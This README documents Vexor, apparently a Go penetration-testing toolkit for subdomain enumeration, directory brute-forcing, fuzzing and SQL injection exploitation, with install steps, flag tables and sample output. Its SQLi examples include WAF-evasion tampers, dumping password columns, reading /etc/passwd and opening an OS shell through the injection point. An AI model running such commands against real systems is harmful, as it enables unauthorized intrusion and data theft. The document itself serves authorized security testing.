```text
 ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗
 ██║   ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗
 ██║   ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝
 ╚██╗ ██╔╝██╔══╝   ██╔██╗ ██║   ██║██╔══██╗
  ╚████╔╝ ███████╗██╔╝ ██╗╚██████╔╝██║  ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
```

**High-Performance Offensive Security Toolkit written in Go**

[ English ] | [ العربية (Arabic) ](README.ar.md)

[![Go](https://img.shields.io/badge/Go-1.21%2B-00ADD8?style=flat-square&logo=go)](https://go.dev/dl/)
[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
[![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
[![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)

Vexor is a single-binary attack tool for web recon and SQL injection testing.
No runtime dependencies, no bloat — just a binary, your wordlists, and a target.

```bash
# Quick install
go install github.com/0xseif-code/vexor/cmd/vexor@latest
```

---

## Overview

| Module | Function | Core Technique / Engine |
|---|---|---|
| 🔍 **Subdomain** | Domain Reconnaissance | Active DNS Worker-Pool + Passive crt.sh |
| 📁 **Directory** | Endpoint Discovery | Recursive Scanning + Smart Baseline Filtering |
| 🎯 **Fuzzing** | Parameter Mining | Multi-position markers (`FUZZ`) + Response Analysis |
| 💉 **SQLi** | Vulnerability Exploitation | 7 Core Detection Techniques + WAF Evasion Tampers |
| 📚 **Wordlists** | Cache Manager | Auto on-demand SecLists downloader (`~/.vexor/`) |

---

## Installation

### Method 1 — Go Install (Recommended)

Requires **Go 1.21+**:

```bash
go install github.com/0xseif-code/vexor/cmd/vexor@latest

# make sure $GOPATH/bin is on your PATH
export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
```

### Method 2 — From Source

```bash
git clone https://github.com/0xseif-code/vexor.git
cd vexor

make build          # Linux/macOS → ./bin/vexor
# or: go build -o vexor ./cmd/vexor

# Windows
go build -o vexor.exe ./cmd/vexor
```

### Method 3 — Release Binary

Grab a prebuilt binary for your platform from the
[Releases](https://github.com/0xseif-code/vexor/releases) page. Assets follow
`vexor-<os>-<arch>[.exe]`:

```bash
curl -sL -o vexor https://github.com/0xseif-code/vexor/releases/download/v1.0.0/vexor-linux-amd64
chmod +x vexor && sudo mv vexor /usr/local/bin/
```

First run — pull the wordlist cache once, then go:

```bash
vexor update-wordlists
vexor subdomain -d example.com
```

---

## Command Reference

All commands share the global flags below. Banner, logs, and progress go to
`stderr`; findings go to **stdout** (monochrome, pipe-friendly) — so
`vexor dir -u URL | tee results.txt` just works.

| Flag | Shorthand | Type | Description | Default |
|---|---|---|---|---|
| `--timeout` | | int | Global request timeout (seconds) | `10` |
| `--threads` | | int | Global concurrency threads | `50` |
| `--proxy` | | string | HTTP/SOCKS5 proxy, `http://127.0.0.1:8080` | |
| `--headers` | | stringarray | Custom header, repeatable | |
| `--format` | | string | Output: `plain`, `json`, `csv` | `plain` |
| `--output` | | string | Also write results to a file | |
| `--silent` | | bool | Suppress banner/progress/info logs | `false` |
| `--no-color` | | bool | Disable ANSI colors | `false` |

### `subdomain` — Enumerate subdomains

Active DNS brute-force + passive crt.sh lookups, deduplicated across sources.

| Flag | Shorthand | Type | Description | Default |
|---|---|---|---|---|
| `--domain` | `-d` | string | Target domain (required unless `-l`) | |
| `--list` | `-l` | string | File of target domains, one per line | |
| `--size` | `-s` | string | Wordlist size: `small`, `medium`, `large` | `medium` |
| `--wordlist` | `-w` | string | Custom wordlist path (overrides `-s`) | |
| `--resolvers` | | stringarray | Custom DNS resolvers, repeatable | |
| `--active-only` | | bool | Skip crt.sh, DNS brute-force only | `false` |
| `--passive-only` | | bool | Skip DNS, crt.sh only | `false` |

```bash
vexor subdomain -d example.com -s large --threads 150
vexor subdomain -l domains.txt -s medium
vexor subdomain -d example.com --resolvers 8.8.8.8:53 --resolvers 1.1.1.1:53 --active-only
vexor subdomain -d example.com -w my-subdomains.txt --format json | jq -r '.subdomain'
```

```text
$ vexor subdomain -d example.com -s medium --threads 100
[*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
api.example.com
app.example.com
blog.example.com
cdn.example.com
dev.example.com
shop.example.com
...
[+] domain example.com: 42 subdomains (dns=31, crtsh=11) in 12.4s
[+] subdomain enumeration complete: 42 total subdomains in 12.6s
```

### `dir` — Discover files and directories

Wordlist-driven endpoint probing with soft-404 calibration, recursion, and
extension presets.

| Flag | Shorthand | Type | Description | Default |
|---|---|---|---|---|
| `--url` | `-u` | string | Target URL, e.g. `https://example.com/` (required) | |
| `--size` | `-s` | string | Wordlist size | `medium` |
| `--wordlist` | `-w` | string | Custom wordlist path (overrides `-s`) | |
| `--ext` | `-x` | stringslice | Extensions/presets, e.g. `php,asp,all` | |
| `--recursion` | `-r` | bool | Recurse into discovered directories | `false` |
| `--depth` | | int | Max recursion depth (with `-r`) | `2` |
| `--match-status` | | string | Only report these codes | |
| `--filter-status` | | string | Exclude these codes | |
| `--filter-size` | | string | Exclude these byte sizes | |
| `--rate` | | int | Max requests/second (`0` = unlimited) | `0` |

```bash
vexor dir -u https://example.com -x php,js -r --depth 2
vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297
vexor dir -u https://example.com --match-status 200,301,302 --rate 100
```

```text
$ vexor dir -u https://example.com -x php,js -r --depth 2
[*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
200	2.1 KB	https://example.com/index.php	Home
200	1.4 KB	https://example.com/login.php	Login
302	0 B		https://example.com/admin/
301	0 B		https://example.com/backup/
200	3.8 KB	https://example.com/admin/config.php	Configuration
...
[+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
```

### `fuzz` — Fuzz request parameters

Mark injection points with `FUZZ` in the URL, headers, or body. Responses are
filtered by status, size, and regex.

| Flag | Shorthand | Type | Description | Default |
|---|---|---|---|---|
| `--url` | `-u` | string | Target URL with `FUZZ` marker (required) | |
| `--method` | `-X` | string | HTTP method | `GET` |
| `--data` | `-d` | string | Request body (FUZZ markers supported) | |
| `--wordlist` | `-w` | string | Fuzz preset or custom wordlist path | `parameters` |
| `--match-status` | | string | Only report these codes | |
| `--filter-status` | | string | Exclude these codes | |
| `--filter-size` | | string | Exclude these byte sizes | |
| `--match-regex` | | string | Only report bodies matching this regex | |
| `--filter-regex` | | string | Exclude bodies matching this regex | |
| `--delay` | | duration | Delay between requests, e.g. `100ms` | `0` |

Wordlist presets: `parameters`, `extensions`, `usernames`, `passwords`,
`passwords-large`, `endpoints` — or pass any file path as `-w`.

```bash
vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
```

```text
$ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
[*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
[200] https://example.com/api/query?id=admin (id=admin)
[200] https://example.com/api/query?id=debug (id=debug)
[500] https://example.com/api/query?id=__proto__ (id=__proto__)
...
[+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
```

### `sqli` — Detect and exploit SQL injection

Seven detection techniques across every parameter — boolean, error, time,
union, stacked, inline, and OOB — followed by full exploitation on the first
confirmed point.

| Flag | Shorthand | Type | Description | Default |
|---|---|---|---|---|
| `--url` | `-u` | string | Target URL, e.g. `https://example.com/page?id=1` | |
| `--request` | `-r` | string | Burp-style raw HTTP request file | |
| `--param` | `-p` | string | Only test this parameter | |
| `--dbms` | | string | Force DBMS: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
| `--level` | | int | Test intensity (1-5) | `1` |
| `--risk` | | int | Payload risk (1-3) | `1` |
| `--tamper` | | stringslice | Tamper scripts, e.g. `space2comment,randomcase` | |
| `--auto-tamper` | | bool | Fingerprint WAF + use suggested tamper chain | `false` |
| `--oob-domain` | | string | Domain for OOB (DNS/HTTP) channels | |
| `--dbs` | | bool | Enumerate databases | `false` |
| `--tables` | | bool | Enumerate tables | `false` |
| `--columns` | | bool | Enumerate columns | `false` |
| `--dump` | | bool | Dump table contents | `false` |
| `--database` | `-D` | string | DB name for `--tables/--columns/--dump` | |
| `--table` | `-T` | string | Table name for `--columns/--dump` | |
| `--column` | `-C` | stringslice | Specific columns to dump, repeatable | |
| `--os-shell` | | bool | Interactive OS shell via the injection point | `false` |
| `--read-file` | | string | Read a file from the DB server | |
| `--write-file` | | string | Write a local file to the DB server | |
| `--file-dest` | | string | Remote path for `--write-file` | basename |

```bash
# Basic SQL injection scan
vexor sqli -u "http://target.com/page.php?id=1"

# Automated WAF evasion + data extraction
vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs

# Table dump
vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password

# Full takeover
vexor sqli -u "http://target.com/page.php?id=1" --os-shell
vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
```

```text
$ vexor sqli -u "https://example.com/page?id=1" --level 2
[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
URL query parameter/GET/id technique=error   dbms=mysql confidence=88
POST form parameter/POST/user technique=time      dbms=mysql confidence=76
...
[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
[i] fingerprinted DBMS: mysql

$ vexor sqli -u "https://example.com/page?id=1" --dbs
...
[i] first confirmed injection point: GET/id (boolean)
information_schema
shop
mysql
...
[+] done in 3m41s
```

### `update-wordlists` — Manage the local cache

```bash
vexor update-wordlists
```

Downloads and integrity-checks the SecLists mirror into `~/.vexor/wordlists`.
Run once after installing, then any time you want fresh data.

```text
$ vexor update-wordlists
[*] re-downloading all wordlists into ~/.vexor/wordlists
[*] downloading...  65.30% (18.4 MB / 28.2 MB)
[+] wordlist cache updated: 3 files in 46.8s
[i]   directory/medium    8.2 MB  sha256=9f1e4c22a1b3
[i]   subdomain/large    14.3 MB  sha256=4c8d0e71f5a2
[i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
```

---

## Wordlists & Advanced Configuration

- **Cache location:** `~/.vexor/wordlists/` — auto-downloaded on first use,
  re-fetched with `vexor update-wordlists`.
- **Size presets** (`-s`): `small`, `medium`, `large`. `subdomain`, `dir`,
  and `fuzz` pick sensible defaults per module.
- **Fuzz presets** (`-w`): `parameters`, `extensions`, `usernames`,
  `passwords`, `passwords-large`, `endpoints`.
- **Custom wordlists** (`-w /path/to/file.txt`): any local file, one word per
  line — overrides the size preset.

Output formats are per-scan:

```bash
vexor subdomain -d example.com --format json | jq -r '.subdomain'
vexor dir -u https://example.com --format csv -o results.csv
vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
```

---

## Disclaimer

> **Use responsibly. Authorized testing only.**
>
> Vexor is an offensive security tool. Only use it against systems you own or
> have written permission to test. Unauthorized access to computer systems is
> illegal in most jurisdictions. The author assumes no liability for misuse.

## License

Released under the [MIT License](LICENSE). Copyright (c) 2026 0xseif-code.